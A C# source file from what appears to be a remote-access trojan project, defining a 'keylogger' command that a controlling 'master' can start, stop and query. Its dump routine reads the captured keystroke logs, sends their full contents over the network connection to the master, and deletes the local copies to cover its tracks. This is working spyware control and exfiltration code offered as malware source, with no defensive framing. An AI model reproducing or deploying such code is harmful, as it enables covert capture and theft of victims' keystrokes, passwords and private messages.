using Shared;
using System.Collections.Generic;
using System.IO;
using Slave.Core;

namespace Slave.Commands.KeyLogger
{
    internal class KeyLoggerCommand : ICommand
    {
        public string name { get; } = "keylogger";

        public KeyLoggerManager keyLoggerManager { get; set; }

        public void Process(List<string> args)
        {
            if (keyLoggerManager == null)
                keyLoggerManager = new KeyLoggerManager();

            switch (args[0])
            {
                case "start":
                    StartKeylogger();
                    break;
                case "stop":
                    StopKeylogger();
                    break;
                case "status":
                    SendKeyloggerStatusToMaster();
                    break;
                case "dump":
                    SendKeyLogsToMaster();
                    break;
            }
        }

        void StartKeylogger()
        {
            keyLoggerManager.StartListening();
            SendKeyloggerStatusToMaster();
        }

        void StopKeylogger()
        {
            keyLoggerManager.StopListening();
            SendKeyloggerStatusToMaster();
        }

        void SendKeyloggerStatusToMaster() =>
            SlaveNetworkManager.GetInstance().WriteLine(keyLoggerManager.GetStatus() ? "on" : "off");

        void SendKeyLogsToMaster()
        {
            // Need to stop the logging into files to prevent IO exceptions
            keyLoggerManager.StopFileLogging();
            var logFiles = keyLoggerManager.GetLogFilesPath();
            foreach (var file in logFiles)
            {
                var fileName = file.Substring(file.LastIndexOf('\\') + 1);
                SlaveNetworkManager.GetInstance().WriteLine(fileName);
                try
                {
                    SlaveNetworkManager.GetInstance().WriteLine(File.ReadAllText(file));
                    File.Delete(file);
                }
                catch (IOException)
                {
                    // Couldn't read file : send error
                    SlaveNetworkManager.GetInstance().WriteLine($"KO:{fileName}");
                }
            }
            SlaveNetworkManager.GetInstance().WriteLine("{end}");

            keyLoggerManager.StartFileLogging();
        }
    }
}
